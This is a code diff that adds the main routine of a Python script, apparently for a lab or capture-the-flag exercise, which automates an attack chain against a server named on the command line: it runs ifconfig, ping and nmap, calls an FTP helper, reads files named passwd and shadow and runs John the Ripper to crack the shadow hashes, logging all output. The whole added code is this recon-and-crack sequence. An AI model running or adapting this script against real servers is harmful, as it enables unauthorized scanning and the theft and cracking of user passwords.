@@ -113,3 +113,26 @@ def main():
         Returns:
            
         """
+
+    if len(sys.argv) != 2:
+        print("Use the syntax: python myAutoCommand.py <server_address>")
+        sys.exit(1)
+
+    server_address = sys.argv[1]
+
+    with open(OutputFile, "w") as output_file:
+        output_file.write("=== Automated Recon / Transfer Log ===\n")
+        output_file.write(f"Target Server: {server_address}\n")
+
+        run_command("ifconfig eth0", output_file)
+        run_command("ping "+ server_address + " -c 4", output_file)
+        run_command("nmap "+ server_address, output_file)    
+        ftp_commands(server_address, output_file)
+        run_command("tail passwd", output_file)
+        run_command("tail shadow", output_file)
+        run_command("john shadow", output_file)
+
+    print(f"\nAll output saved to {OutputFile}")
+
+if __name__ == "__main__":
+    main()
